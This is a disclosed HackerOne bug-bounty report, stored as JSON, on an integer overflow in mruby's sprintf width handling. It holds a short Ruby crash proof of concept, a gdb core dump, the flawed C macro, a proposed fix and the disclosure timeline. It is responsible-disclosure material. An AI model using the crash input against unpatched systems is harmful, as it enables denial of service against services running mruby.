{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2017-02-28T20:24:47.883Z", 
    "voters": [
        "heeeeen", 
        "eveeez", 
        "spetr0x"
    ], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "100.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 204628, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2017-02-27T23:30:51.205Z", 
    "vulnerability_information": "The mruby sprintf gem (out of scope of mruby-engine) can be crashed when using a hostile \"width\" value in the format string.\n\nExploit Script\n===========\n```ruby\ns = \"hello\"\nsprintf(\"abcdefghijklmnopqrstuvwxyz % 2147483640s\", s)\n```\n\nHere is the core dump:\n```\nCore was generated by `ext/mruby_engine/mruby/build/host/bin/mirb'.\nProgram terminated with signal SIGSEGV, Segmentation fault.\n#0  0xb768bd7a in ?? ()\n(gdb) bt\n#0  0xb768bd7a in ?? ()\n#1  0x00000006 in ?? ()\n#2  0x0813d000 in ?? ()\nBacktrace stopped: previous frame inner to this frame (corrupt stack?)\n(gdb) info reg\neax            0x20202020\t538976288\necx            0x1fff62c7\t536830663\nedx            0x1\t1\nebx            0x800\t2048\nesp            0xbfe037c4\t0xbfe037c4\nebp            0x78\t0x78\nesi            0x81d7dc8\t136150472\nedi            0x8216000\t136404992\neip            0xb768bd7a\t0xb768bd7a\neflags         0x10202\t[ IF RF ]\ncs             0x73\t115\nss             0x7b\t123\nds             0x7b\t123\nes             0x7b\t123\nfs             0x0\t0\ngs             0x33\t51\n```\n\nTech Details\n==========\nThe sprintf.c file in the mrb_str_format() function is responsible for the building of the formatted string. When using a \"width\" value for anything (string, char, number, etc...) there is an integer-overflow in the CHECK() macro that is responsible for assuring the string's capacity will be enough for the operation:\n```cpp\n#define CHECK(l) do { \\\n  while (blen + (l) >= bsiz) {\\\n    bsiz*=2;\\\n  }\\\n  mrb_str_resize(mrb, result, bsiz);\\\n  buf += RSTRING_PTR(result);\\\n} while(0)\n``` \n\nProposed Fix\n===========\nSince ```bsiz``` is always bigger-or-equal to ```blen``` the right check should be:\n```cpp\n#define CHECK(l) do { \\\n  while ((l) >= bsiz - blen) {\\\n    bsiz*=2;\\\n  }\\\n  mrb_str_resize(mrb, result, bsiz);\\\n  buf += RSTRING_PTR(result);\\\n} while(0)\n``` \nThis way no arithmetic operation will done over the \"width\" parameter which can be up to MAX_INT in size, causing many possible integer-overflow.", 
    "activity_page_count": 1, 
    "severity": {
        "rating": "medium", 
        "author_type": "User"
    }, 
    "title": "segafult in mruby's sprintf - mrb_str_format", 
    "is_member_of_team?": null, 
    "vote_count": 3, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2017-03-29T23:30:51.241Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "activity_page_number": 1, 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$100", 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "automated_response": true, 
            "created_at": "2017-02-08T15:18:56.876Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-02-08T15:18:56.876Z", 
            "actor": {
                "url": "/shopify-scripts", 
                "profile": {
                    "name": "shopify-scripts"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/015/668/b50db49e93f656e202ae6f94b4c0821d1184134b_medium.jpg?1475592254"
                }
            }, 
            "team_handle": "shopify-scripts", 
            "message": "Thank you for reporting this bug! This is an automated response to let you know that we've received your issue, and we'll process it as soon as possible.\n\nDue to the large volume of reports we have received, it may take us up to three weeks to respond. Thank you for your patience!", 
            "markdown_message": "<p>Thank you for reporting this bug! This is an automated response to let you know that we&#39;ve received your issue, and we&#39;ll process it as soon as possible.</p>\n\n<p>Due to the large volume of reports we have received, it may take us up to three weeks to respond. Thank you for your patience!</p>\n", 
            "type": "Activities::Comment", 
            "id": 1471421, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-02-08T15:43:12.389Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-02-08T15:43:12.389Z", 
            "actor": {
                "username": "clayton", 
                "url": "/clayton", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/019/166/6d366b567e9fef1c476c1505c0016e3031a74a34_medium.jpg?1493127129"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify-scripts", 
            "message": "Thank you for your report. We have reproduced the crash and opened an issue upstream: https://github.com/mruby/mruby/issues/3439", 
            "markdown_message": "<p>Thank you for your report. We have reproduced the crash and opened an issue upstream: <a title=\"https://github.com/mruby/mruby/issues/3439\" href=\"/redirect?signature=f4f3e413e9c03c9363d3c377ab5a6e1ba443ba8c&amp;url=https%3A%2F%2Fgithub.com%2Fmruby%2Fmruby%2Fissues%2F3439\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/mruby/mruby/issues/3439</span><i class=\"icon-external-link\"></i></a></p>\n", 
            "type": "Activities::BugTriaged", 
            "id": 1471516, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "aerodudrizzt", 
                "url": "/aerodudrizzt"
            }, 
            "created_at": "2017-02-22T19:14:39.917Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-02-22T19:14:39.917Z", 
            "actor": {
                "username": "clayton", 
                "url": "/clayton", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/019/166/6d366b567e9fef1c476c1505c0016e3031a74a34_medium.jpg?1493127129"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify-scripts", 
            "message": "Thank you for your report. This issue was addressed upstream in https://github.com/mruby/mruby/commit/ff03a9a61c62340cff62f8e0fdc1a1e8775b6f17.\n\nOur next round of bounty decisions will take place within two weeks, so we'll be in touch with you again soon.", 
            "markdown_message": "<p>Thank you for your report. This issue was addressed upstream in <a title=\"https://github.com/mruby/mruby/commit/ff03a9a61c62340cff62f8e0fdc1a1e8775b6f17\" href=\"/redirect?signature=637915e0cf58017063cabe441082fa2c27745efe&amp;url=https%3A%2F%2Fgithub.com%2Fmruby%2Fmruby%2Fcommit%2Fff03a9a61c62340cff62f8e0fdc1a1e8775b6f17\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/mruby/mruby/commit/ff03a9a61c62340cff62f8e0fdc1a1e8775b6f17</span><i class=\"icon-external-link\"></i></a>.</p>\n\n<p>Our next round of bounty decisions will take place within two weeks, so we&#39;ll be in touch with you again soon.</p>\n", 
            "type": "Activities::BugResolved", 
            "id": 1500015, 
            "genius_execution_id": null
        }, 
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2017-02-27T23:30:45.624Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-02-27T23:30:45.624Z", 
            "actor": {
                "url": "/shopify-scripts", 
                "profile": {
                    "name": "shopify-scripts"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/015/668/b50db49e93f656e202ae6f94b4c0821d1184134b_medium.jpg?1475592254"
                }
            }, 
            "team_handle": "shopify-scripts", 
            "bonus_amount": "0.0", 
            "bounty_amount": "100.0", 
            "collaborator": {
                "username": "aerodudrizzt", 
                "url": "/aerodudrizzt"
            }, 
            "message": "Thanks for helping improve the security of the MRuby project!", 
            "markdown_message": "<p>Thanks for helping improve the security of the MRuby project!</p>\n", 
            "type": "Activities::BountyAwarded", 
            "id": 1509647, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-02-27T23:30:51.220Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-02-27T23:30:51.220Z", 
            "actor": {
                "username": "andrewdunbar", 
                "url": "/andrewdunbar", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/019/164/cd46f5270ea41c5f0da3bea93e2eca7a95858caf_medium.jpg?1427927985"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify-scripts", 
            "first_to_agree": true, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1509648, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-02-28T05:53:32.342Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-02-28T05:53:32.342Z", 
            "actor": {
                "username": "aerodudrizzt", 
                "url": "/aerodudrizzt", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/098/646/dd4a57adcca0f309d5866361ff6cf9a683425281_medium.png?1483983167"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify-scripts", 
            "message": "Thanks for the reward. The report can be publicly disclosed.", 
            "markdown_message": "<p>Thanks for the reward. The report can be publicly disclosed.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1510223, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-02-28T13:56:02.497Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-02-28T13:56:02.497Z", 
            "actor": {
                "username": "clayton", 
                "url": "/clayton", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/019/166/6d366b567e9fef1c476c1505c0016e3031a74a34_medium.jpg?1493127129"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify-scripts", 
            "message": "There should be an option to agree to disclosure at the bottom of the report.", 
            "markdown_message": "<p>There should be an option to agree to disclosure at the bottom of the report.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1511015, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-02-28T20:24:47.899Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-02-28T20:24:47.899Z", 
            "actor": {
                "username": "aerodudrizzt", 
                "url": "/aerodudrizzt", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/098/646/dd4a57adcca0f309d5866361ff6cf9a683425281_medium.png?1483983167"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify-scripts", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1511899, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-02-28T20:24:47.932Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-02-28T20:24:47.932Z", 
            "actor": {
                "username": "aerodudrizzt", 
                "url": "/aerodudrizzt", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/098/646/dd4a57adcca0f309d5866361ff6cf9a683425281_medium.png?1483983167"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify-scripts", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 1511900, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "aerodudrizzt", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/aerodudrizzt", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/098/646/6dd706f25a4db060df25b01c8609c8f1762533f0_small.png?1483983167"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 48, 
        "name": "Denial of Service"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -53305919.82492094, 
    "disclosed_at": "2017-02-28T20:24:47.917Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/204628", 
    "created_at": "2017-02-08T15:18:56.665Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p>The mruby sprintf gem (out of scope of mruby-engine) can be crashed when using a hostile &quot;width&quot; value in the format string.</p>\n\n<h1 id=\"exploit-script\">Exploit Script</h1>\n<pre class=\"highlight ruby\"><code><span class=\"n\">s</span> <span class=\"o\">=</span> <span class=\"s2\">&quot;hello&quot;</span>\n<span class=\"nb\">sprintf</span><span class=\"p\">(</span><span class=\"s2\">&quot;abcdefghijklmnopqrstuvwxyz % 2147483640s&quot;</span><span class=\"p\">,</span> <span class=\"n\">s</span><span class=\"p\">)</span>\n</code></pre>\n<p>Here is the core dump:</p>\n<pre class=\"highlight plaintext\"><code>Core was generated by `ext/mruby_engine/mruby/build/host/bin/mirb&#39;.\nProgram terminated with signal SIGSEGV, Segmentation fault.\n#0  0xb768bd7a in ?? ()\n(gdb) bt\n#0  0xb768bd7a in ?? ()\n#1  0x00000006 in ?? ()\n#2  0x0813d000 in ?? ()\nBacktrace stopped: previous frame inner to this frame (corrupt stack?)\n(gdb) info reg\neax            0x20202020   538976288\necx            0x1fff62c7   536830663\nedx            0x1  1\nebx            0x800    2048\nesp            0xbfe037c4   0xbfe037c4\nebp            0x78 0x78\nesi            0x81d7dc8    136150472\nedi            0x8216000    136404992\neip            0xb768bd7a   0xb768bd7a\neflags         0x10202  [ IF RF ]\ncs             0x73 115\nss             0x7b 123\nds             0x7b 123\nes             0x7b 123\nfs             0x0  0\ngs             0x33 51\n</code></pre>\n<h1 id=\"tech-details\">Tech Details</h1>\n\n<p>The sprintf.c file in the mrb_str_format() function is responsible for the building of the formatted string. When using a &quot;width&quot; value for anything (string, char, number, etc...) there is an integer-overflow in the CHECK() macro that is responsible for assuring the string&#39;s capacity will be enough for the operation:</p>\n<pre class=\"highlight cpp\"><code><span class=\"cp\">#define CHECK(l) do { \\\n  while (blen + (l) &gt;= bsiz) {\\\n    bsiz*=2;\\\n  }\\\n  mrb_str_resize(mrb, result, bsiz);\\\n  buf += RSTRING_PTR(result);\\\n} while(0)\n</span></code></pre>\n<h1 id=\"proposed-fix\">Proposed Fix</h1>\n\n<p>Since <code>bsiz</code> is always bigger-or-equal to <code>blen</code> the right check should be:</p>\n<pre class=\"highlight cpp\"><code><span class=\"cp\">#define CHECK(l) do { \\\n  while ((l) &gt;= bsiz - blen) {\\\n    bsiz*=2;\\\n  }\\\n  mrb_str_resize(mrb, result, bsiz);\\\n  buf += RSTRING_PTR(result);\\\n} while(0)\n</span></code></pre>\n<p>This way no arithmetic operation will done over the &quot;width&quot; parameter which can be up to MAX_INT in size, causing many possible integer-overflow.</p>\n", 
    "severity_rating": "medium", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://www.mruby.science", 
            "about": "", 
            "twitter_handle": "", 
            "name": "shopify-scripts"
        }, 
        "handle": "shopify-scripts", 
        "url": "https://hackerone.com/shopify-scripts", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/015/668/9f47d94cbd9e4311b57f1ab05f67fb5c26fd2e78_small.jpg?1475592254", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/015/668/b50db49e93f656e202ae6f94b4c0821d1184134b_medium.jpg?1475592254"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 15668, 
        "default_currency": "usd"
    }, 
    "is_published": false
}